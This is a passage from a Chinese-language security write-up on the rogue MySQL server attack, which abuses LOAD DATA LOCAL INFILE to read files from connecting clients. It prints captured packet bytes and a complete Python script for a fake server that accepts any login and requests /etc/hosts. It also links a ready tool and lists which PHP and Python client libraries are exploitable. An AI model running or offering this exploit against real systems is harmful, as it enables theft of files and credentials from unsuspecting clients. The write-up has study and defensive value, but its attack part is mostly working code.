  2. 受害者向攻击者提供的服务器发起请求，并尝试进行身份认证
  3. 攻击者的MySQL接受到受害者的连接请求，攻击者发送正常的问候、身份验证正确，并且向受害者的MySQL客户端请求文件。
  4. 受害者的MySQL客户端认为身份验证正确，执行攻击者的发来的请求，通过LOAD DATA INLINE 功能将文件内容发送回攻击者的MySQL服务器。
  5. 攻击者收到受害者服务器上的信息，读取文件成功，攻击完成。
攻击已经被写成了工具，工具将模拟一个假的MySQL服务器发送payload读取文件。
MySQL协议的一个特殊功能是客户端根本不跟踪请求的命令，完全基于服务器响应执行查询。所以模仿mysql服务器就变得简单，模拟初始握手，等待SQL语句包，然后忽略它，发出我们自己的LOAD
DATA 的SQL语句等待响应。
为了成功利用，我们还需要客户端至少向我们的假服务器发出一次查询，这也很容易，还记得之前分析LOAD DATA
INFILE时我们找到的查询版本信息的SQL包吗`select
@@version_comment`？并且客户端向服务器发出的任何请求，我们只需回答`Auth OK`，就可以欺骗客户端，让客户端认为已经得到授权。
下面是从.pcap文件中得到的发包数据：
  1. Auth OK：
        0000   b0 35 9f 44 95 a3 08 00 27 19 f2 99 08 00 45 00   °5.D.£..'.ò...E.
     0010   00 3f f9 5e 40 00 40 06 2c c0 0a 00 00 3d 0a 00   .?ù^@.@.,À...=..
     0020   00 5e 0c ea ce 64 05 79 a6 55 f5 b2 1e 7b 80 18   .^.êÎd.y¦Uõ².{..
     0030   00 eb fd 46 00 00 01 01 08 0a 00 b2 5c ab 1a 89   .ëýF.......²\«..
     0040   49 a8 07 00 00 02 00 00 00 02 00 00 00            I¨...........
  2. 服务器问候：
        0000   b0 35 9f 44 95 a3 08 00 27 19 f2 99 08 00 45 00   °5.D.£..'.ò...E.
     0010   00 93 f9 5c 40 00 40 06 2c 6e 0a 00 00 3d 0a 00   ..ù\@.@.,n...=..
     0020   00 5e 0c ea ce 64 05 79 a5 f6 f5 b2 1d d2 80 18   .^.êÎd.y¥öõ².Ò..
     0030   00 e3 e6 34 00 00 01 01 08 0a 00 b2 5c aa 1a 89   .ãæ4.......²\ª..
     0040   49 a5 5b 00 00 00 0a 35 2e 36 2e 32 38 2d 30 75   I¥[....5.6.28-0u
     0050   62 75 6e 74 75 30 2e 31 34 2e 30 34 2e 31 00 2d   buntu0.14.04.1.-     0060   00 00 00 40 3f 59 26 4b 2b 34 60 00 ff f7 08 02   ...@?Y&K+4`.ÿ÷..
     0070   00 7f 80 15 00 00 00 00 00 00 00 00 00 00 68 69   ..............hi
     0080   59 5f 52 5f 63 55 60 64 53 52 00 6d 79 73 71 6c   Y_R_cU`dSR.mysql
     0090   5f 6e 61 74 69 76 65 5f 70 61 73 73 77 6f 72 64   _native_password
     00a0   00
  3. 请求/etc/passwd文件
        0000   b0 35 9f 44 95 a3 08 00 27 19 f2 99 08 00 45 00   °5.D.£..'.ò...E.
     0010   00 43 f9 5f 40 00 40 06 2c bb 0a 00 00 3d 0a 00   .Cù_@.@.,»...=..
     0020   00 5e 0c ea ce 64 05 79 a6 60 f5 b2 1e a0 80 18   .^.êÎd.y¦`õ². ..
     0030   00 eb e6 5c 00 00 01 01 08 0a 00 b2 5c ab 1a 89   .ëæ\.......²\«..
     0040   49 a9 0b 00 00 01 fb 2f 65 74 63 2f 68 6f 73 74   I©....û/etc/host
     0050   73
上给出个一个脚本：
    #!/usr/bin/python
    #coding: utf8
    import socket
    # linux :
    filestring = "/etc/hosts"
    # windows:
    #filestring = "C:\\Windows\\system32\\drivers\\etc\\hosts"
    HOST = "0.0.0.0" # open for eeeeveryone! ^_^
    PORT = 3306
    BUFFER_SIZE = 1024
    #1 Greeting
    greeting = "\x5b\x00\x00\x00\x0a\x35\x2e\x36\x2e\x32\x38\x2d\x30\x75\x62\x75\x6e\x74\x75\x30\x2e\x31\x34\x2e\x30\x34\x2e\x31\x00\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"
    #2 Accept all authentications
    authok = "\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"
    #3 Payload
    payloadlen = "\x0b" 
    padding = "\x00\x00"
    payload = payloadlen + padding +  "\x0b\x00\x00\x01\xfb\x2f\x65\x74\x63\x2f\x68\x6f\x73\x74\x73"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(1)
    while True:
        conn, addr = s.accept()
        print 'Connection from:', addr
        conn.send(greeting)
        while True:
            data = conn.recv(BUFFER_SIZE)
            print " ".join("%02x" % ord(i) for i in data)
            conn.send(authok)
            data = conn.recv(BUFFER_SIZE)
            conn.send(payload)
            print "[*] Payload send!"
            data = conn.recv(BUFFER_SIZE)
            if not data: break
            print "Data received:", data
            break
        # Don't leave the connection open.
        conn.close()
你也可以使用[Rogue-MySql-Server Tool](https://github.com/allyshka/Rogue-MySql-Server) 工具。
附攻击视频：
[演示视频](http://bmob-cdn-22571.b0.upaiyun.com/2019/01/25/771d189940cb1e6480487a09d264ea82.webm
"演示视频")
请注意：PHP有一些mysql客户端扩展，如mysql、mysqli、pdo，除了pdo外都可以被利用，因为pdo默认禁止读取本地数据，你需要通过设置PDO::MYSQL_ATTR_LOCAL_INFILE为true来启用本地数据读取。同样的，如果客户端使用的是python的MySQLdb，也需要先设置local_infile连接选项。
当然，上述攻击的用法远不止如此，从外国大佬的文章看来还有可以挖掘的地方，比如滥用Web框架来读取服务器文件：当Web用户尝试修改MySQL主机的表单并将其指向恶意服务器时，攻击者就能够读取文件
参考链接：